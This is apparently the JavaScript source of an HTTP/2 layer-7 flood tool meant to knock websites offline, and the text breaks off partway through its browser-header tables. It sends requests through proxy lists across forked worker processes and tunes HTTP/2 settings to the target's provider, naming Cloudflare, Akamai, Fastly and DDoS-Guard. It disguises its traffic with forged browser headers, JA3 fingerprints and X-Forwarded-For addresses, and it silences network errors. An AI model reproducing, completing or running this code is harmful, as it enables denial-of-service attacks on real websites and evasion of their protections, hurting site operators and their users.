const net = require("net");
const http2 = require("http2");
const http = require('http');
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const dns = require('dns');
const fetch = require('node-fetch');
const util = require('util');
const socks = require('socks').SocksClient;
const crypto = require("crypto");
const HPACK = require('hpack');
const fs = require("fs");
const os = require("os");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    settings.forEach(([id, value], i) => {
        data.writeUInt16BE(id, i * 6);
        data.writeUInt32BE(value, i * 6 + 2);
    });
    return data;
}

const urihost = [
    'google.com',
    'youtube.com',
    'facebook.com',
    'baidu.com',
    'wikipedia.org',
    'twitter.com',
    'amazon.com',
    'yahoo.com',
    'reddit.com',
    'netflix.com'
];
clength = urihost[Math.floor(Math.random() * urihost.length)];

function encodeFrame(streamId, type, payload = "", flags = 0) {
    const frame = Buffer.alloc(9 + payload.length);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0) frame.set(payload, 9);
    return frame;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function generateRandomString(min, max) {
    const len = Math.floor(Math.random() * (max - min + 1)) + min;
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length: len }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}

function randnum(minLength, maxLength) {
    const characters = '0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join('');
}

const cplist = [
    "TLS_AES_128_CCM_8_SHA256",
    "TLS_AES_128_CCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_AES_128_GCM_SHA256"
];
var cipper = cplist[Math.floor(Math.random() * cplist.length)];

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return !1;
}).setMaxListeners(0);

require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];
let SignalsList = sigalgs.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

// ========== PERUBAHAN: HAPUS SSL_OP_NO_TLSv1_3 ==========
const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    // crypto.constants.SSL_OP_NO_TLSv1_3 |   // <-- DIHAPUS
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

if (process.argv.length < 7) {
    console.clear();
    console.log(' L7 HTTP/2 Flood/Bypass - TLS 1.3 ONLY');
    console.log('────────────────────────────────────────────────────────────');
    console.log(' Usage: '.blue + 'node lev.js host time rate threads proxyfile'.white);
    console.log('────────────────────────────────────────────────────────────');
    console.log('<host>      = '.white + 'Target URL (example: https://example.com)'.blue);
    console.log('<time>      = '.white + 'Duration in seconds'.blue);
    console.log('<rate>      = '.white + 'Requests per second'.blue);
    console.log('<threads>   = '.white + 'Number of threads'.blue);
    console.log('<proxyfile> = '.white + 'Proxy file (proxy.txt)'.blue);
    console.log('────────────────────────────────────────────────────────────'.white);
    process.exit();
}

const secureProtocol = "TLS_method";
const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
};

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(Boolean);
}
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

function generateRandomCookies() {
    const cookieNames = ['session', 'user_id', 'visitor', 'auth', 'preferences', 'PHPSESSID', 'csrf_token', 'theme', 'language', 'viewed_items'];
    const cookieValues = ['abc123', 'xyz789', 'user12345', 'true', 'false', crypto.randomBytes(8).toString('hex')];
    const numCookies = Math.floor(Math.random() * 5) + 1;
    let cookieStr = '';
    for (let i = 0; i < numCookies; i++) {
        const name = cookieNames[Math.floor(Math.random() * cookieNames.length)];
        const value = cookieValues[Math.floor(Math.random() * cookieValues.length)];
        cookieStr += `${name}=${value}; `;
    }
    return cookieStr.trim();
}

const referers = [
    'https://www.google.com/', 'https://www.bing.com/', 'https://www.yahoo.com/',
    'https://www.facebook.com/', 'https://www.twitter.com/', 'https://www.instagram.com/',
    'https://www.linkedin.com/', 'https://www.reddit.com/', 'https://www.youtube.com/',
    'https://www.amazon.com/', 'https://www.netflix.com/', 'https://www.baidu.com/',
    'https://www.wikipedia.org/', 'https://www.live.com/', 'https://www.naver.com/',
    'https://www.msn.com/', 'https://www.pinterest.com/', 'https://www.whatsapp.com/',
    'https://www.qq.com/', 'https://www.tiktok.com/'
];

class NetSocket {
    constructor() { }

    async SOCKS5(options, callback) {
        const address = options.address.split(':');
        socks.createConnection({
            proxy: { host: options.host, port: options.port, type: 5 },
            command: 'connect',
            destination: { host: address[0], port: +address[1] }
        }, (error, info) => {
            if (error) return callback(undefined, error);
            return callback(info.socket, undefined);
        });
    }

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({ host: options.host, port: options.port });
        connection.setTimeout(options.timeout * 100000);
        connection.setKeepAlive(true, 100000);
        connection.setNoDelay(true);
        connection.on("connect", () => connection.write(buffer));
        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });
        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
    }
}
const Socker = new NetSocket();

const lookupPromise = util.promisify(dns.lookup);
let isp = '';

async function getIPAndISP(host) {
    try {
        const { address } = await lookupPromise(host);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp || '';
        }
    } catch (error) {}
}
getIPAndISP(parsedTarget.host);

function getSettingsBasedOnISP(isp) {
    const defaultSettings = {
        headerTableSize: 65536,
        initialWindowSize: Math.random() < 0.5 ? 6291456 : 33554432,
        maxHeaderListSize: 262144,
        enablePush: false,
        maxConcurrentStreams: Math.random() < 0.5 ? 100 : 1000,
        maxFrameSize: 16384,
        enableConnectProtocol: false,
    };
    const settings = { ...defaultSettings };
    if (isp === 'Cloudflare, Inc.') {
        settings.maxConcurrentStreams = Math.random() < 0.5 ? 100 : 1000;
        settings.initialWindowSize = 65536;
    } else if (['FDCservers.net', 'OVH SAS', 'VNXCLOUD'].includes(isp)) {
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 65536;
        settings.maxFrameSize = 16777215;
        settings.maxConcurrentStreams = 128;
        settings.maxHeaderListSize = 4294967295;
    } else if (['Akamai Technologies, Inc.', 'Akamai International B.V.'].includes(isp)) {
        settings.headerTableSize = 4096;
        settings.maxConcurrentStreams = 100;
        settings.initialWindowSize = 6291456;
        settings.maxHeaderListSize = 32768;
    } else if (['Fastly, Inc.', 'Optitrust GmbH'].includes(isp)) {
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 65535;
        settings.maxConcurrentStreams = 100;
        settings.maxHeaderListSize = 4294967295;
    } else if (isp === 'Ddos-guard LTD') {
        settings.maxConcurrentStreams = 8;
        settings.initialWindowSize = 65535;
        settings.maxFrameSize = 16777215;
        settings.maxHeaderListSize = 262144;
    } else if (['Amazon.com, Inc.', 'Amazon Technologies Inc.'].includes(isp)) {
        settings.maxConcurrentStreams = 100;
        settings.initialWindowSize = 65535;
        settings.maxHeaderListSize = 262144;
    } else if (['Microsoft Corporation', 'Vietnam Posts and Telecommunications Group', 'VIETNIX'].includes(isp)) {
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 8388608;
        settings.maxConcurrentStreams = 100;
        settings.maxHeaderListSize = 4294967295;
    } else if (isp === 'Google LLC') {
        settings.headerTableSize = 4096;
        settings.initialWindowSize = 1048576;
        settings.maxConcurrentStreams = 100;
        settings.maxHeaderListSize = 137216;
    }
    return settings;
}

const MAX_RAM_PERCENTAGE = 85;
const RESTART_DELAY = 1000;
function getRandomHeapSize() {
    return Math.floor(Math.random() * (5222 - 1000 + 1)) + 1000;
}

if (cluster.isMaster) {
    console.clear();
    console.log(`--------------------------------------------`.gray);
    console.log(`Target: `.blue + args.target.white);
    console.log(`Time: `.blue + args.time.toString().white);
    console.log(`Rate: `.blue + args.Rate.toString().white);
    console.log(`Thread: `.blue + args.threads.toString().white);
    console.log(`ProxyFile: `.blue + args.proxyFile.white);
    console.log(`ProxyTotal: `.blue + proxies.length.toString().white);
    console.log(`--------------------------------------------`.gray);

    const restartScript = () => {
        for (const id in cluster.workers) cluster.workers[id].kill();
        console.log('[>] Restarting script in', RESTART_DELAY, 'ms...');
        setTimeout(() => {
            for (let i = 1; i <= args.threads; i++) {
                const heapSize = getRandomHeapSize();
                cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
            }
        }, RESTART_DELAY);
    };

    const handleRAMUsage = () => {
        const totalRAM = os.totalmem();
        const usedRAM = totalRAM - os.freemem();
        const ramPercentage = (usedRAM / totalRAM) * 100;
        if (ramPercentage >= MAX_RAM_PERCENTAGE) {
            console.log('[!] RAM usage:', ramPercentage.toFixed(2), '% - restarting');
            restartScript();
        }
    };
    setInterval(handleRAMUsage, 5000);

    for (let i = 1; i <= args.threads; i++) {
        const heapSize = getRandomHeapSize();
        cluster.fork({ NODE_OPTIONS: `--max-old-space-size=${heapSize}` });
    }
} else {
    setInterval(runFlooder, 1);
}

function taoDoiTuongNgauNhien() {
    const doiTuong = {};
    const maxi = randomIntn(2, 3);
    for (let i = 1; i <= maxi; i++) {
        const key = 'cf-sec-' + generateRandomString(1, 9);
        const value = generateRandomString(1, 10) + '-' + generateRandomString(1, 12) + '=' + generateRandomString(1, 12);
        doiTuong[key] = value;
    }
    return doiTuong;
}

const browsers = ["chrome", "safari", "brave", "firefox", "mobile", "opera", "operagx", "duckduckgo"];
function getRandomBrowser() {
    return browsers[Math.floor(Math.random() * browsers.length)];
}

function generateHeaders(browser) {
    const versions = {
        chrome: { min: 115, max: 125 },
        safari: { min: 14, max: 17 },
        brave: { min: 115, max: 125 },
        firefox: { min: 100, max: 115 },
        mobile: { min: 95, max: 115 },
        opera: { min: 85, max: 105 },
        operagx: { min: 85, max: 105 },
        duckduckgo: { min: 12, max: 17 }
    };
    const ja3Fingerprints = [
        "771,4866-4867-4865-49196-49195-52392-49188-49187-49191-49190-49200-49199-158-157-159-52394-49327-49325-49329-49308-49307-49311-49310-52393-49315-49313-49317-49316,0-23-65281-10-35-13-43-51-45-27-17513-16-18-21,29-23-24,0",
        "771,4866-4867-4865-49196-49195-52392-49188-49187-49191-49190-49200-49199-158-157-159-52394,0-23-65281-10-35-13-43-51-45-27-16-18-21,29-23-24,0",
        "771,4865-4866-4867-49195-49196-49199-49200-52392-49327-49325-49329-49308-49307-49311-49310-52394-49315-49313-49317-49316,0-65281-23-10-35-13-43-51-45-27-16-18-21,23-24-29,0",
        "771,4865-4866-4867-49195-49196-49199-49200-158-159-52392-52394-49327-49325-49329-49308-49307-49311-49310-52393-49315-49313-49317-49316,0-23-10-35-13-43-51-45-27-16-18-21,23-24-29,0",
        "771,4866-4867-4865-49196-49195-52392-49188-49187-49191-49190-49200-49199-158-157-159-49327-49325-49329-49308-49307-49311-49310-49315-49313-49317-49316,0-65281-10-35-13-43-51-45-27-16-18-21,23-24-29,0",
        "771,4866-4867-4865-49196-49195-52392-49188-49187-49191-49190-49200-49199-158-157-159-52394,0-23-65281-10-35-13-43-51-45-27-16-18-21,29-23-24,0",
        "771,4865-4866-4867-49195-49196-49199-49200-52392-158-159-49327-49325-49329-49308-49307-49311-49310-49315-49313-49317-49316,0-23-10-35-13-43-51-45-27-16-18-21,29-23-24,0",
        "771,4865-4866-4867-49195-49196-49199-49200-158-159-49327-49325-49329-49308-49307-49311-49310-49315-49313-49317-49316,0-65281-23-10-35-13-43-51-45-27-16-18-21,23-24-29,0",
        "771,4866-4867-4865-49196-49195-52392-49188-49187-49191-49190-49200-49199-158-157-159-52394-49327-49325-49329-49308-49307-49311-49310-49315-49313-49317-49316,0-23-65281-10-35-13-43-51-45-27-16-18-21,29-23-24,0",
        "771,4866-4867-4865-49196-49195-52392-49188-49187-49191-49190-49200-49199-158-157-159-52394-49327-49325-49329-49308-49307-49311-49310-52393-49315-49313-49317-49316,0-23-65281-10-35-13-43-51-45-27-17513-16-18-21,29-23-24,0",
        "771,4866-4867-4865-49196-49195-52392-49188-49187-49191-49190-49200-49199-158-157-159-52394-49327-49325-49329-49308-49307-49311-49310-49315-49313-49317-49316,0-23-65281-10-35-13-43-51-45-27-16-18-21,29-23-24,0",
        "771,4866-4867-4865-49196-49195-52392-49188-49187-49191-49190-49200-49199-158-157-159-52394,0-23-65281-10-35-13-43-51-45-27-16-18-21,29-23-24,0"
    ];
    const ja3Spoof = ja3Fingerprints[Math.floor(Math.random() * ja3Fingerprints.length)];
    const ipRanges = ["104.28.", "172.67.", "198.41.", "185.60.", "23.82.", "8.8.", "9.9.", "1.1.", "151.101.", "185.182.", "192.168.", "10.0.", "203.0.", "198.51."];
    const randomIPv4 = () => `${ipRanges[Math.floor(Math.random() * ipRanges.length)]}${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(1 + Math.random() * 253)}`;
    const randomIPv6 = () => `2001:db8:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}:${Math.floor(Math.random() * 9999)}`;

    const headersMap = {
        brave: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3, 3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Brave";v="${Math.floor(99 + Math.random() * 6)}", "Chromium";v="${Math.floor(119 + Math.random() * 6)}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(119 + Math.random() * 6)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36 Brave/${Math.floor(99 + Math.random() * 6)}.0.0.0`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://www.google.com/", "https://store.steampowered.com/", "https://www.epicgames.com/", "https://www.twitch.tv/", "https://discord.com/", "https://www.opera.com/gx", "https://www.youtube.com/", "https://twitter.com/", "https://www.instagram.com/"][Math.floor(Math.random() * 9)],
            "origin": ["https://www.opera.com/gx", "https://discord.com", "https://store.steampowered.com", "https://www.twitch.tv"][Math.floor(Math.random() * 4)],
            "x-forwarded-for": Math.random() < 0.4 ? randomIPv4() : randomIPv6(),
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "te": Math.random() < 0.5 ? "trailers" : "gzip",
            "ja3-fingerprint": ja3Spoof
        },
        chrome: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3, 3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": ["Windows", "Android", "macOS", "Linux"][Math.floor(Math.random() * 4)],
            "sec-ch-ua-platform-version": ["10.0.0", "11.0.0", "12.0.0", "13.0.0", "14.0.0", "15.0.0"][Math.floor(Math.random() * 6)],
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(115 + Math.random() * 10)}.0.${Math.floor(Math.random() * 5000)}.0 Safari/537.36`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://www.facebook.com/", "https://twitter.com/", "https://news.ycombinator.com/", "https://reddit.com/", "https://www.linkedin.com/", "https://www.quora.com/", "https://www.medium.com/", "https://www.github.com/"][Math.floor(Math.random() * 11)],
            "origin": ["https://www.google.com", "https://www.bing.com", "https://duckduckgo.com", "https://twitter.com"][Math.floor(Math.random() * 4)],
            "x-forwarded-for": Math.random() < 0.4 ? randomIPv4() : randomIPv6(),
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "te": Math.random() < 0.5 ? "trailers" : "gzip",
            "ja3-fingerprint": ja3Spoof
        },
        safari: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3, 3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Safari";v="${Math.floor(13 + Math.random() * 3)}", "AppleWebKit";v="${Math.floor(600 + Math.random() * 10)}"`,
            "sec-ch-ua-mobile": Math.random() < 0.5 ? "?1" : "?0",
            "sec-ch-ua-platform": ["iPhone", "iPad", "macOS"][Math.floor(Math.random() * 3)],
            "sec-ch-ua-platform-version": ["10.0.0", "11.0.0", "12.0.0", "13.0.0", "14.0.0"][Math.floor(Math.random() * 5)],
            "user-agent": `Mozilla/5.0 (Macintosh; ${Math.random() < 0.5 ? "Intel" : "PowerPC"} Mac OS X ${Math.floor(10 + Math.random() * 10)}_${Math.floor(10 + Math.random() * 10)}_${Math.floor(Math.random() * 10)}) AppleWebKit/537.36 (KHTML, like Gecko) Safari/${Math.floor(600 + Math.random() * 10)}.${Math.floor(Math.random() * 5)}.${Math.floor(Math.random() * 5)}.${Math.floor(Math.random() * 5)}`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://www.apple.com/", "https://www.google.com/", "https://duckduckgo.com/", "https://www.facebook.com/", "https://www.instagram.com/", "https://www.twitter.com/", "https://www.youtube.com/", "https://www.reddit.com/", "https://www.medium.com/"][Math.floor(Math.random() * 9)],
            "origin": ["https://www.apple.com", "https://www.google.com", "https://duckduckgo.com", "https://twitter.com"][Math.floor(Math.random() * 4)],
            "x-forwarded-for": Math.random() < 0.4 ? randomIPv4() : randomIPv6(),
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "te": Math.random() < 0.5 ? "trailers" : "gzip",
            "ja3-fingerprint": ja3Spoof
        },
        mobile: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3, 3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Chromium";v="${Math.floor(99 + Math.random() * 6)}", "Google Chrome";v="${Math.floor(100 + Math.random() * 50)}", "Not-A.Brand";v="99"`,
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": ["Android", "iOS"][Math.floor(Math.random() * 2)],
            "sec-ch-ua-platform-version": ["10.0", "11.0", "12.0", "13.0", "14.0"][Math.floor(Math.random() * 5)],
            "user-agent": Math.random() < 0.5
                ? `Mozilla/5.0 (Linux; Android ${Math.floor(10 + Math.random() * 5)}; ${Math.random() < 0.5 ? "Pixel" : "Samsung"} ${Math.floor(3 + Math.random() * 3)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${Math.floor(100 + Math.random() * 50)}.0.${Math.floor(Math.random() * 5000)}.0 Mobile Safari/537.36`
                : `Mozilla/5.0 (iPhone; CPU iPhone OS ${Math.floor(10 + Math.random() * 5)}_${Math.floor(0 + Math.random() * 5)} like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/${Math.floor(10 + Math.random() * 3)}.${Math.floor(Math.random() * 5)} Safari/537.36`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/", "https://www.instagram.com/", "https://twitter.com/", "https://www.facebook.com/", "https://www.youtube.com/", "https://www.tiktok.com/", "https://www.reddit.com/"][Math.floor(Math.random() * 9)],
            "origin": ["https://www.instagram.com", "https://www.google.com", "https://www.facebook.com", "https://twitter.com"][Math.floor(Math.random() * 4)],
            "x-forwarded-for": Math.random() < 0.4 ? randomIPv4() : randomIPv6(),
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "te": Math.random() < 0.5 ? "trailers" : "gzip",
            "ja3-fingerprint": ja3Spoof
        },
        firefox: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3, 3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Mozilla Firefox";v="${Math.floor(95 + Math.random() * 5)}", "Gecko";v="${Math.floor(1000 + Math.random() * 50)}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "Windows",
            "sec-ch-ua-platform-version": Math.random() < 0.5 ? `"10.0"` : `"11.0"`,
            "user-agent": `Mozilla/5.0 (Windows NT ${Math.random() < 0.5 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/${Math.floor(90 + Math.random() * 10)}.0 Safari/537.36`,
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8,application/json;q=0.5",
            "accept-language": Math.random() < 0.4 ? "en-US,en;q=0.9" : Math.random() < 0.4 ? "id-ID,id;q=0.9" : "fr-FR,fr;q=0.8",
            "accept-encoding": Math.random() < 0.5 ? "gzip, deflate, br" : "gzip, deflate, lz4, br",
            "referer": ["https://www.google.com/", "https://www.mozilla.org/", "https://www.reddit.com/", "https://twitter.com/", "https://www.facebook.com/", "https://www.youtube.com/", "https://www.github.com/", "https://www.linkedin.com/", "https://www.medium.com/"][Math.floor(Math.random() * 9)],
            "origin": ["https://www.mozilla.org", "https://www.reddit.com", "https://twitter.com", "https://www.google.com"][Math.floor(Math.random() * 4)],
            "x-forwarded-for": Math.random() < 0.4 ? randomIPv4() : randomIPv6(),
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": Math.random() < 0.5 ? "same-origin" : "cross-site",
            "cache-control": Math.random() < 0.5 ? "max-age=0" : "no-cache, no-store, must-revalidate",
            "upgrade-insecure-requests": Math.random() < 0.7 ? "1" : "0",
            "dnt": Math.random() < 0.5 ? "1" : "0",
            "te": Math.random() < 0.5 ? "trailers" : "gzip",
            "ja3-fingerprint": ja3Spoof
        },
        opera: {
            ":method": "GET",
            ":authority": Math.random() < 0.5 ? parsedTarget.host : "www." + parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + generateRandomString(3, 3) + "=" + generateRandomString(5, 10),
            "sec-ch-ua": `"Opera";v="${Math.floor(79 + Math.random() * 5)}", "Chromium";v="${Math.floor(115 + Math.random() * 10)}"`,
            "sec-ch-ua-mobile": "?0",
